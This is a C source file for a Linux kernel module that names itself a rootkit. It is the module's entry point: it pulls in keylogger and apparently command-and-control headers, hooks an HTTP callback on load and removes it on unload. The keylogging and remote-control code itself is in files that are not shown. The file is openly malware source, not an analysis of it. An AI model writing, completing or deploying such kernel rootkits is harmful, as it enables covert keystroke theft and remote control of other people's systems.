#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/types.h>
#include <linux/delay.h>
#include "credit.h"
#include "cnc.h"

#include "keylogger.h"

void clean_rootkit ( void );
void quiter (char * busy);
int init_rootkit ( void );

int init_rootkit ( void )
{
	printk(KERN_INFO "[+] Colman: init_rootkit\n");
	set_http_callback();

	return 0;
}

int quiter_thread (void * is_busy)
{
	char * busy = (char *)is_busy; 
	if (!busy)
	{
		printk(KERN_INFO "[-] Colman: Something get really wrong!\n");
	}
	else 
	{
		while((*busy))
		{
			msleep(10);
		}
		printk(KERN_INFO "[+] Colman: clean_rootkit()\n");	
		//clean_rootkit();
	}
	do_exit(0);
}

void clean_rootkit ( void )
{
	printk(KERN_INFO "[+] Colman: clean_rootkit\n");
	unset_http_callback();
}



module_init(init_rootkit);
module_exit(clean_rootkit);
